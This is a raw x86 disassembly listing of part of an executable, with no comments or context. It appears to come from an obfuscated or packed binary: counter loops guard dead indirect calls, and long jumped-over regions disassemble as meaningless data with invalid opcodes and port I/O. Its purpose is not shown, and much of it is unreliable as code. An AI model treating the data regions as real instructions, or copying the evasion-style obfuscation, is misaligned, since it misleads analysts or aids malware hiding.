  406b1d:	cmp    DWORD PTR ds:0x4304df,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x4304df,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e9df
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x4304df
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x4304df,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x430435,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x4304d7,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x4304d7
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x4304d7,ecx
  406b87:	cmp    DWORD PTR ds:0x4304d7,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x4304d7,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e7e6
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42eaa7
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e7c8
  406bcd:	add    DWORD PTR ds:0x43043d,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42edcb
  406bdf:	and    edi,DWORD PTR ds:0x4304e3
  406be5:	mov    DWORD PTR ds:0x42edcb,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0xf22b7504
  406bfe:	mov    cl,bh
  406c00:	cmp    bh,BYTE PTR gs:[esi+0x7e]
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406bb5
  406c09:	jmp    0xe6521aa0
  406c0e:	mov    dh,0x92
  406c10:	mov    al,ds:0xbdcf1020
  406c15:	cmp    eax,0xa8068dcc
  406c1a:	xchg   DWORD PTR [edi+0x2b3e728a],ebx
  406c20:	and    BYTE PTR [ebp-0x5af9690e],bl
  406c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c27:	xor    BYTE PTR [esi-0x60571cc9],bl
  406c2d:	mov    cl,0x6f
  406c2f:	outs   dx,BYTE PTR ds:[esi]
  406c30:	imul   eax,DWORD PTR [ecx],0xffffffda
  406c33:	push   esp
  406c34:	out    dx,eax
  406c35:	pop    ds
  406c36:	mov    ch,0xad
  406c38:	test   DWORD PTR [ebx+ebx*4+0x2615902a],edx
  406c3f:	pusha  
  406c40:	xor    al,0x80
  406c42:	jb     0x406c84
  406c44:	in     al,0x86
  406c46:	fstp   DWORD PTR [ebx]
  406c48:	push   esi
  406c49:	addr16 cs add al,0xb0
  406c4d:	pop    ss
  406c4e:	adc    BYTE PTR [ecx+0x4e93a976],0x81
  406c55:	cs ret 0x1062
  406c59:	sbb    BYTE PTR [esi-0x74cda896],bl
  406c5f:	ja     0x406caf
  406c61:	jns    0x406c6c
  406c63:	xchg   esp,eax
  406c64:	std    
  406c65:	xor    DWORD PTR [ecx],edi
  406c67:	mov    dh,0xef
  406c69:	test   BYTE PTR [eax],0x3b
  406c6c:	mov    ch,0x97
  406c6e:	out    0xd5,eax
  406c70:	jmp    0x406cb9
  406c72:	sbb    DWORD PTR [ebx-0x1d543746],ebx
  406c78:	dec    ebp
  406c79:	dec    eax
  406c7a:	pushf  
  406c7b:	or     edi,DWORD PTR ds:0xb47cde0d
  406c81:	mov    ebp,0x2af3f8fe
  406c86:	pop    ss
  406c87:	call   0xd68e:0x134858ae
  406c8e:	mov    bh,0xf9
  406c90:	dec    eax
  406c91:	out    0xfe,al
  406c93:	inc    esp
  406c94:	sub    ebx,0x69
  406c97:	mov    ecx,DWORD PTR [ebx-0x58]
  406c9a:	jae    0x406ce0
  406c9c:	push   edx
  406c9d:	xchg   DWORD PTR [ebp+0xbe1d2de],esi
  406ca3:	ret    
  406ca4:	int    0x7
  406ca6:	push   ss
  406ca7:	dec    ecx
  406ca8:	in     eax,0x20
  406caa:	cmc    
  406cab:	sbb    al,0x94
  406cad:	add    edi,DWORD PTR [eax+0x41e8b355]
  406cb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cb4:	aam    0xfc
  406cb6:	scas   eax,DWORD PTR es:[edi]
  406cb7:	retf   0x96d6
  406cba:	or     eax,0x55597a99
  406cbf:	push   es
  406cc0:	sbb    al,0x95
  406cc2:	push   ebx
  406cc3:	stos   BYTE PTR es:[edi],al
  406cc4:	clc    
  406cc5:	pop    edi
  406cc6:	shl    DWORD PTR [esi],1
  406cc8:	jmp    0xe92b:0x81314f30
  406ccf:	rcl    DWORD PTR [edi+0x6d],1
  406cd2:	jno    0x406ca1
  406cd4:	adc    DWORD PTR [ebp+0x4b43e523],esi
  406cda:	es scas al,BYTE PTR es:[edi]
  406cdc:	xor    ah,BYTE PTR [esi]
  406cde:	mov    edx,0x92041c64
  406ce3:	rcl    BYTE PTR [ebx+0x74c6102],0x57
  406cea:	std    
  406ceb:	xchg   esp,eax
  406cec:	lods   eax,DWORD PTR ds:[esi]
  406ced:	leave  
  406cee:	cmp    al,0x69
  406cf0:	fsubp  st(4),st
  406cf2:	das    
  406cf3:	fimul  WORD PTR [edx]
  406cf5:	hlt    
  406cf6:	imul   ebp,ebp,0x1d61de97
  406cfc:	adc    eax,0xfcaa4f43
  406d01:	mov    DWORD PTR [edx+edx*4+0x36d271a6],esi
  406d08:	add    eax,0x9efaa041
  406d0d:	pop    eax
  406d0e:	and    DWORD PTR [edx+edx*2-0x48b9b529],ecx
  406d15:	sahf   
  406d16:	clc    
  406d17:	lock mov BYTE PTR [edx],cl
  406d1a:	jb     0x406d06
  406d1c:	jo     0x406cb3
  406d1e:	lods   eax,DWORD PTR ds:[esi]
  406d1f:	lods   al,BYTE PTR ds:[esi]
  406d20:	xor    ebx,DWORD PTR [eax+0x41a20822]
  406d26:	mov    eax,ds:0xd7a03183
  406d2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d2c:	pop    eax
  406d2d:	out    dx,eax
  406d2e:	inc    esi
  406d2f:	in     eax,0xaf
  406d31:	adc    eax,DWORD PTR [eax]
  406d33:	je     0x406d5c
  406d35:	mov    ebp,0x4c51a07f
  406d3a:	test   ebp,0x6d2da19b
  406d40:	jmp    0x33df:0xa2e4b9a
  406d47:	je     0x406d62
  406d49:	nop
  406d4a:	into   
  406d4b:	pop    edx
  406d4c:	test   DWORD PTR [eax+0x3616078a],eax
  406d52:	retf   0x5de4
  406d55:	xchg   esp,eax
  406d56:	and    eax,0x917b93aa
  406d5b:	push   ebx
  406d5c:	js     0x406d92
  406d5e:	js     0x406cf9
  406d60:	or     ebx,edi
  406d62:	retf   
  406d63:	iret   
  406d64:	inc    esi
  406d65:	sub    cl,BYTE PTR [ecx+0x7b]
  406d68:	push   cs
  406d69:	fisttp QWORD PTR [esi]
  406d6b:	jg     0x406dc7
  406d6d:	cwde   
  406d6e:	adc    DWORD PTR [ecx],ecx
  406d70:	loope  0x406d5b
  406d72:	pop    esp
  406d73:	or     DWORD PTR [eax],esp
  406d75:	pop    eax
  406d76:	sub    al,0x18
  406d78:	out    dx,al
  406d79:	out    0xaa,al
  406d7b:	out    0x6b,eax
  406d7d:	jecxz  0x406d05
  406d7f:	mov    esp,0x6dacfd2d
  406d84:	push   esp
  406d85:	test   al,0xc6
  406d87:	inc    esi
  406d88:	sbb    eax,0xde0fc8a1
  406d8d:	push   ebp
  406d8e:	jecxz  0x406d39
  406d90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d91:	jl     0x406d7a
  406d93:	adc    eax,0x2cd5497a
  406d98:	push   ds
  406d99:	imul   eax,esi,0x76
  406d9c:	add    edx,ecx
  406d9e:	and    DWORD PTR ds:0x4304df,0x0
  406da8:	mov    edi,DWORD PTR ds:0x4304df
  406dae:	inc    edi
  406daf:	mov    DWORD PTR ds:0x4304df,edi
  406db5:	cmp    DWORD PTR ds:0x4304df,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42ec23
  406dcb:	cmp    DWORD PTR ds:0x4304df,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x4304df
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x4304df,edi
  406de7:	cmp    DWORD PTR ds:0x4304df,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e7c0,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx+0x2ab88485],si
  406e0c:	xor    bh,ah
  406e0e:	stc    
  406e0f:	icebp  
  406e10:	cmp    BYTE PTR [esi+0x7e],bh
  406e13:	mov    bh,BYTE PTR [edi+0x7e]
  406e16:	jle    0x406df7
  406e18:	cdq    
  406e19:	cmc    
  406e1a:	dec    eax
  406e1b:	test   BYTE PTR [eax],0xdf
  406e1e:	jmp    0x406e55
  406e20:	test   ecx,0x6b09f87a
  406e26:	in     al,dx
  406e27:	mov    ebx,0xe32ea8e8
  406e2c:	jg     0x406eaa
  406e2e:	les    ebx,FWORD PTR [eax-0x2fd5090a]
  406e34:	mov    al,0xf1
  406e36:	ins    DWORD PTR es:[edi],dx
  406e37:	inc    esi
  406e38:	mov    ah,0x81
  406e3a:	xor    DWORD PTR [ecx+ecx*2-0x1d],esp
  406e3e:	pop    ecx
  406e3f:	sbb    DWORD PTR [esp+esi*4-0x26],edi
  406e43:	add    bh,bl
  406e45:	loopne 0x406eb7
  406e47:	shr    cl,cl
  406e49:	stos   BYTE PTR es:[edi],al
  406e4a:	mov    dl,0xb
  406e4c:	mov    ebp,0xc286ef8f
  406e51:	xor    DWORD PTR [edx*4+0x71625f3e],esp
  406e58:	dec    esp
  406e59:	push   ebx
  406e5a:	(bad)  
  406e5c:	add    ebp,DWORD PTR [ebx]
  406e5e:	mov    dh,0xc6
  406e60:	sub    BYTE PTR [ebp+0x7b],al
  406e63:	pop    eax
  406e64:	mov    ecx,0xb8482824
  406e69:	int    0xd
  406e6b:	dec    ebx
  406e6c:	in     eax,dx
  406e6d:	sbb    eax,0x8208faba
  406e72:	repnz and DWORD PTR [ebp+ecx*2+0x60],0xbb0b5fd3
  406e7b:	sub    dl,dh
  406e7d:	jae    0x406eef
  406e7f:	push   ebp
  406e80:	loopne 0x406ed3
  406e82:	test   DWORD PTR [ebx+0x650fbd60],esp
  406e88:	mov    al,ds:0x8a20438a
  406e8d:	mov    bh,BYTE PTR [esi+0x3d]
  406e90:	or     al,0x6b
  406e92:	ss jne 0x406e32
  406e95:	mov    DWORD PTR [ebp+0x726db8c],ebx
  406e9b:	cli    
  406e9c:	or     ch,0x44
  406e9f:	pop    ebx
  406ea0:	and    DWORD PTR [esi],ebx
  406ea2:	dec    BYTE PTR [ebp-0x5c]
  406ea5:	ret    0x7334
  406ea8:	inc    ebx
  406ea9:	ret    0x17bf
  406eac:	aam    0xe6
  406eae:	stc    
  406eaf:	repnz repnz sti 
  406eb2:	(bad)  
  406eb3:	or     cl,bl
  406eb5:	push   eax
  406eb6:	fsub   QWORD PTR [edx-0xb3ceaa0]
  406ebc:	out    0xeb,eax
  406ebe:	and    eax,0xce550df
  406ec3:	sub    BYTE PTR [ebx+0x1c],ah
  406ec6:	aaa    
  406ec7:	cdq    
  406ec8:	sub    eax,DWORD PTR [esi]
  406eca:	out    dx,eax
  406ecb:	idiv   bl
  406ecd:	lock dec esp
  406ecf:	jp     0x406eb6
  406ed1:	cmp    eax,0xfb72cedc
  406ed6:	mov    eax,0xf5bc6142
  406edb:	aam    0xca
  406edd:	xor    DWORD PTR [ecx+0x7db14dbe],0xa10264ab
  406ee7:	ficom  WORD PTR [esi-0x7014485b]
  406eed:	outs   dx,BYTE PTR ds:[esi]
  406eee:	int3   
  406eef:	outs   dx,BYTE PTR ds:[esi]
  406ef0:	js     0x406f54
  406ef2:	jge    0x406ef5
  406ef4:	and    al,0x6e
  406ef6:	call   0x98ed:0xe7d60452
  406efd:	add    bl,BYTE PTR [edi]
  406eff:	fnstsw WORD PTR [edx]
  406f01:	in     al,0xff
  406f03:	mov    ch,0xc8
  406f05:	stos   DWORD PTR es:[edi],eax
  406f06:	inc    eax
  406f07:	lock (bad) 
  406f09:	aaa    
  406f0a:	cmc    
  406f0b:	push   eax
  406f0c:	cmp    WORD PTR [ecx-0x6b],sp
  406f10:	cmp    ch,ch
  406f12:	push   0xfffffffa
  406f14:	sub    ebp,DWORD PTR [ebx+0x756aa2c]
  406f1a:	inc    edi
  406f1b:	dec    ebp
  406f1c:	jg     0x406f71
  406f1e:	rcl    DWORD PTR [edx+edx*1+0xece8faf],cl
  406f25:	jmp    0x65c5:0x1a784924
  406f2c:	test   DWORD PTR [esi-0x27],ebx
  406f2f:	jecxz  0x406f44
  406f31:	cmp    al,0x25
  406f33:	iret   
  406f34:	and    edi,ebp
  406f36:	mov    ebx,0x77bbf4af
  406f3b:	inc    ebx
  406f3c:	sub    eax,0xf6508445
  406f41:	in     al,0xb3
  406f43:	hlt    
  406f44:	out    0x4d,eax
  406f46:	mov    bl,0x41
  406f48:	pop    esi
  406f49:	adc    dl,BYTE PTR cs:[ebp-0x12]
  406f4d:	pop    es
  406f4e:	sbb    BYTE PTR [ecx],0xc2
  406f51:	pushf  
  406f52:	or     dl,BYTE PTR [ebx+0x78]
  406f55:	add    al,0x23
  406f57:	mov    WORD PTR [edi],?
  406f59:	push   cs
  406f5a:	sar    DWORD PTR [eax+0x25196468],0x1b
  406f61:	dec    BYTE PTR ds:0x58acb3c0
  406f67:	push   esi
  406f68:	pop    edi
  406f69:	aas    
  406f6a:	sub    al,0x61
  406f6c:	js     0x406f0f
  406f6e:	inc    ebx
  406f6f:	cmp    ch,BYTE PTR [esi]
  406f71:	fcomi  st,st(4)
  406f73:	and    ch,BYTE PTR [ecx-0x724a7355]
  406f79:	je     0x406f04
  406f7b:	das    
  406f7c:	test   eax,0x8a96b045
  406f81:	or     eax,0x6e6fd58
  406f86:	adc    edx,DWORD PTR [edi-0x17e78634]
  406f8c:	adc    bl,BYTE PTR [edi-0x36039227]
  406f92:	push   0x7a6a171c
  406f97:	mov    ebp,0x3f9dab00
  406f9c:	xchg   ebp,eax
  406f9d:	sbb    esi,DWORD PTR [edi+eax*4-0x36]
  406fa1:	push   0xffffff98
  406fa3:	dec    ecx
  406fa4:	hlt    
  406fa5:	lea    ebp,[eax]
  406fa7:	iret   
  406fa8:	jnp    0x406f89
  406faa:	dec    esi
  406fab:	mov    DWORD PTR [ebp-0x8],edx
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x430465
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x430445,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0x41d23d82,edx
  406fd4:	lock aaa 
  406fd6:	or     eax,0x8a7e7ec6
  406fdb:	jg     0x40705b
  406fdd:	jle    0x406ff3
  406fdf:	pop    ss
  406fe0:	not    DWORD PTR [edi]
  406fe2:	inc    ebx
  406fe3:	pop    ebx
  406fe4:	cmp    BYTE PTR [edx-0x43],dl
  406fe7:	lods   eax,DWORD PTR ds:[esi]
  406fe8:	fwait
  406fe9:	das    
  406fea:	sti    
  406feb:	in     eax,0x9c
  406fed:	xchg   esp,eax
  406fee:	retf   
  406fef:	int3   
  406ff0:	popa   
  406ff1:	push   es
  406ff2:	(bad)  
  406ff3:	shr    DWORD PTR [esi+0x2bc627d7],1
  406ff9:	sub    eax,0xb6e67ca0
  406ffe:	fld    QWORD PTR [ecx-0x35]
  407001:	ret    0x261b
  407004:	pusha  
  407005:	pop    ebp
  407006:	mov    ah,ch
  407008:	scas   al,BYTE PTR es:[edi]
  407009:	loopne 0x407047
  40700b:	minps  xmm4,xmm7
  40700e:	fld    TBYTE PTR [edx+0x3078f1b0]
  407014:	or     cl,BYTE PTR [edx+eiz*1+0x25]
  407018:	push   es
  407019:	sbb    al,0xd9
  40701b:	test   al,0x31
  40701d:	pop    esi
  40701e:	jns    0x40700a
  407020:	mov    ?,WORD PTR [ebx+edx*2+0x2b]
  407024:	in     eax,0x25
  407026:	dec    esp
  407027:	neg    DWORD PTR [ebx-0x47846005]
  40702d:	cmc    
  40702e:	push   0xffffffd9
  407030:	jmp    0x406fc0
  407032:	mov    BYTE PTR [esp+edi*8-0x27055ccf],cl
  407039:	xchg   BYTE PTR [esi],ch
  40703b:	aaa    
  40703c:	mov    bh,BYTE PTR [eax]
  40703e:	xchg   ebx,eax
  40703f:	or     BYTE PTR [edx],al
  407041:	arpl   bx,cx
  407043:	sub    al,0x3a
  407045:	js     0x407042
  407047:	inc    esp
  407048:	retf   0xbc9a
  40704b:	enter  0x36f7,0xfc
  40704f:	add    DWORD PTR [edx+0x69],ecx
  407052:	test   al,0x73
  407054:	ja     0x407051
  407056:	or     ebp,DWORD PTR [ebp+0x2b]
  407059:	mov    eax,ds:0xa0e7e579
  40705e:	xchg   ebp,eax
  40705f:	fdivp  st(1),st
  407061:	jg     0x4070b2
  407063:	cmp    esi,eax
  407065:	jo     0x4070bc
  407067:	jge    0x406ffc
  407069:	mov    al,ds:0xd3d1ddd
  40706e:	add    BYTE PTR [esi+edx*2],al
  407071:	in     al,dx
  407072:	xor    ebp,DWORD PTR [eax]
  407074:	jns    0x40702b
  407076:	adc    al,0xe3
  407078:	repnz and eax,ebx
  40707b:	lea    ebx,[edx-0x667d6336]
  407081:	jnp    0x40707d
  407083:	push   cs
  407084:	xor    bl,BYTE PTR [edx-0x71]
  407087:	ins    BYTE PTR es:[edi],dx
  407088:	mov    ds:0x83aa99de,eax
  40708d:	xor    al,0x4c
  40708f:	into   
  407090:	inc    esi
  407091:	(bad)  [edi]
  407093:	add    al,0x62
  407095:	cmc    
  407096:	xchg   esp,eax
  407097:	xor    BYTE PTR [ecx+0x4e8c6cba],ch
  40709d:	repnz arpl si,ax
  4070a0:	fcomp  DWORD PTR [edi]
  4070a2:	out    0xff,al
  4070a4:	jg     0x4070e0
  4070a6:	(bad)  
  4070a8:	daa    
  4070a9:	cs mov al,0xf8
  4070ac:	les    ebp,FWORD PTR [ebp+0x23]
  4070af:	mov    al,0xef
  4070b1:	ja     0x4070fe
  4070b3:	mov    ebx,0xb23a7789
  4070b8:	inc    ecx
  4070b9:	(bad)  
  4070ba:	mov    al,ds:0x31bb5aad
  4070bf:	idiv   DWORD PTR [ebx]
  4070c1:	xchg   DWORD PTR [edi+0x199253e7],esp
  4070c7:	dec    BYTE PTR [ebp+ebp*1-0x1d]
  4070cb:	ss xor al,0x1f
  4070ce:	fcmovnbe st,st(7)
  4070d0:	adc    al,0x14
  4070d2:	jae    0x4070a4
  4070d4:	pop    esi
  4070d5:	imul   edi,DWORD PTR [eax],0xe5b7fc4f
  4070db:	mov    bh,0xfb
  4070dd:	inc    esp
  4070de:	nop
  4070df:	cmc    
  4070e0:	fimul  WORD PTR [esi]
  4070e2:	push   ecx
  4070e3:	add    al,0xf3
  4070e5:	cmp    eax,0xd9ba6096
  4070ea:	mov    bh,0x70
  4070ec:	dec    edx
  4070ed:	ins    BYTE PTR es:[edi],dx
  4070ee:	outs   dx,BYTE PTR ds:[esi]
  4070ef:	mov    edx,0x57b4c231
  4070f4:	mov    ch,0xb4
  4070f6:	push   0x8dc84a77
  4070fb:	in     al,dx
  4070fc:	push   cs
  4070fd:	loope  0x4070df
  4070ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407100:	pop    esi
  407101:	sub    al,0xf9
  407103:	adc    BYTE PTR [eax+edi*4+0xe],ah
  407107:	jp     0x40713f
  407109:	cwde   
  40710a:	push   esi
  40710b:	and    BYTE PTR [ebx+ecx*1+0x54607f12],ch
  407112:	lahf   
  407113:	sub    edi,0xffffffab
  407116:	xor    DWORD PTR [edi],ebp
  407118:	mov    edi,DWORD PTR [ebp+0x1e]
  40711b:	dec    esp
  40711c:	out    dx,eax
  40711d:	xchg   ebp,eax
  40711e:	adc    eax,DWORD PTR ds:0x97b18b2f
  407124:	or     DWORD PTR [ebp-0x52ebe4],ebp
  40712a:	int3   
  40712b:	lods   al,BYTE PTR ds:[esi]
  40712c:	lods   al,BYTE PTR ds:[esi]
  40712d:	xchg   BYTE PTR [edi-0x35],dh
  407130:	xor    dh,ah
  407132:	and    DWORD PTR [ecx+eiz*8+0x279a9916],edx
  407139:	lahf   
  40713a:	sbb    ebx,DWORD PTR [eax-0x3c]
  40713d:	inc    esp
  40713e:	sbb    DWORD PTR [edx-0x1357b948],eax
  407144:	retf   0xc6f2
  407147:	call   0xc9ae:0x8c714984
  40714e:	push   eax
  40714f:	mov    bh,0xf2
  407151:	jmp    0xee06:0xdcdd2968
  407158:	adc    al,0xa1
  40715a:	scas   al,BYTE PTR es:[edi]
  40715b:	loope  0x4071a4
  40715d:	lods   al,BYTE PTR ds:[esi]
  40715e:	loop   0x407118
  407160:	xchg   BYTE PTR [esi-0x19],al
  407163:	add    al,0x9f
  407165:	or     DWORD PTR [ebp-0x31],0x79
  407169:	js     0x40710a
  40716b:	mov    ecx,0xcef774f7
  407170:	addr16 in al,0x89
  407173:	push   ebp
  407174:	or     al,0x81
  407176:	and    eax,0x42e7c0
  40717b:	add    BYTE PTR [eax],al
  40717d:	add    BYTE PTR [eax],al
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e7c0
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e7c0,edi
  407191:	cmp    DWORD PTR ds:0x42e7c0,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e7c0,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42eaab
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x430469,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x43044d
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x430461,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x430461
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x430461,edi
  4071fa:	cmp    DWORD PTR ds:0x430461,0x6
  407201:	jne    0x407247
  407207:	push   0x42e929
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42eaaf
  407247:	cmp    DWORD PTR ds:0x430461,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x430461
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x430461,edi
  407261:	cmp    DWORD PTR ds:0x430461,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e7bc
  40728e:	or     DWORD PTR ds:0x430465,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0x33a3f15
  4072a7:	aam    0xb8
  4072a9:	cdq    
  4072aa:	(bad)  
  4072ab:	jle    0x40732b
  4072ad:	mov    bh,BYTE PTR [edi+0x7e]
  4072b0:	jle    0x407249
  4072b2:	ins    BYTE PTR es:[edi],dx
  4072b3:	push   ss
  4072b4:	dec    ebp
  4072b5:	mov    ch,0xb
  4072b7:	or     eax,0x62de419a
  4072bc:	fst    QWORD PTR [edx+ecx*1-0x6507ba4e]
  4072c3:	jnp    0x40726a
  4072c5:	leave  
  4072c6:	xor    eax,0xafe04509
  4072cb:	int    0xb
  4072cd:	loop   0x4072eb
  4072cf:	adc    BYTE PTR [esi+0x77709614],0x47
  4072d6:	jmp    0x407348
  4072d8:	aaa    
  4072d9:	jnp    0x407284
  4072db:	in     eax,dx
  4072dc:	push   0x42
  4072de:	and    eax,0x2b6ccad9
  4072e3:	sub    bl,BYTE PTR [ebx-0x199a846a]
  4072e9:	call   0x7bc18d0
  4072ee:	mov    dl,0x12
  4072f0:	repnz push cs
  4072f2:	aaa    
  4072f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072f4:	push   esi
  4072f5:	add    BYTE PTR [ebx+edi*2+0x7e51a331],bh
  4072fc:	repnz mov dh,0x64
  4072ff:	jae    0x4072ba
  407301:	idiv   BYTE PTR [ecx+esi*4+0x1caf0390]
  407308:	imul   edi,DWORD PTR ds:[eax+0x3049e13f],0x3d3c986d
  407313:	addr16 mov ebp,0xd67e86d1
  407319:	xlat   BYTE PTR ds:[ebx]
  40731a:	bnd call 0x73702ba0
  407320:	test   eax,0x3b5e573
  407325:	fcmovbe st,st(2)
  407327:	retf   0x9b20
  40732a:	mov    ?,ebx
  40732c:	add    DWORD PTR [ecx+edi*2],ebx
  40732f:	stos   DWORD PTR es:[edi],eax
  407330:	lods   eax,DWORD PTR ds:[esi]
  407331:	inc    ecx
  407332:	pop    ds
  407333:	in     al,0xb6
  407335:	retf   0xf9
  407338:	adc    ebp,eax
  40733a:	xchg   edi,eax
  40733b:	in     al,dx
  40733c:	mov    ah,BYTE PTR [ebp+0x61]
  40733f:	mov    cl,0x4c
  407341:	inc    edx
  407342:	test   eax,0x383a5e64
  407347:	in     eax,0xc
  407349:	ins    DWORD PTR es:[edi],dx
  40734a:	adc    eax,DWORD PTR [ebx]
  40734c:	push   ebp
  40734d:	dec    eax
  40734e:	ja     0x4073b5
  407350:	ds test esp,esi
  407353:	sub    BYTE PTR [edi+0x5a0d5885],cl
  407359:	dec    esi
  40735a:	or     ch,BYTE PTR [edx]
  40735c:	mov    al,0x89
  40735e:	push   ecx
  40735f:	push   esi
  407360:	inc    edi
  407361:	sbb    BYTE PTR [esi+0x7c],ch
  407364:	test   eax,0xf53fa8f4
  407369:	push   0xdfdba033
  40736e:	scas   eax,DWORD PTR es:[edi]
  40736f:	ins    BYTE PTR es:[edi],dx
  407370:	in     eax,dx
  407371:	outs   dx,BYTE PTR ds:[esi]
  407372:	mov    ebx,0x89baa498
  407377:	adc    eax,0xb9ea80d7
  40737c:	xor    al,0xa8
  40737e:	jle    0x407354
  407380:	inc    esp
  407381:	rol    BYTE PTR [eax],0xa6
  407384:	push   ss
  407385:	sub    DWORD PTR [ebx+eax*1],ebp
  407388:	and    dh,0x91
  40738b:	fstp   DWORD PTR [edx]
  40738d:	mov    al,0x38
  40738f:	dec    esp
  407390:	adc    edx,DWORD PTR ds:0xd5dd9b45
  407396:	retf   0xf8f0
  407399:	mov    dh,BYTE PTR [eax-0x275553fa]
  40739f:	add    esi,DWORD PTR [ecx+0x5b63a53e]
  4073a5:	pusha  
  4073a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073a7:	and    eax,0x82aaf6ec
  4073ac:	jno    0x407386
  4073ae:	push   ds
  4073af:	mov    al,ds:0x8c6b315e
  4073b4:	xchg   ebx,eax
  4073b5:	sub    edx,DWORD PTR [eax+esi*2-0x4e]
  4073b9:	mov    edi,ecx
  4073bb:	shl    DWORD PTR es:[ebp+0xafc94e0],cl
  4073c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073c3:	js     0x407416
  4073c5:	inc    BYTE PTR [esi-0x79]
  4073c8:	push   0x2bde9bda
  4073cd:	loope  0x407370
  4073cf:	mov    bl,0x41
  4073d1:	xor    al,0x32
  4073d3:	jecxz  0x407362
  4073d5:	xchg   esi,eax
  4073d6:	lea    esi,[edx+ebx*2+0x4c]
  4073da:	push   ss
  4073db:	(bad)  
  4073dc:	(bad)  
  4073dd:	mov    edx,0x729adf44
  4073e2:	call   0x216aad12
  4073e7:	loop   0x4073b1
  4073e9:	call   0x2769be80
  4073ee:	(bad)  
  4073ef:	(bad)  
  4073f0:	mov    edx,DWORD PTR es:[ebx-0x5f04632]
  4073f7:	or     BYTE PTR [edi+eax*8],dh
  4073fa:	imul   ebx,DWORD PTR [edi+0x6d],0x9a47b954
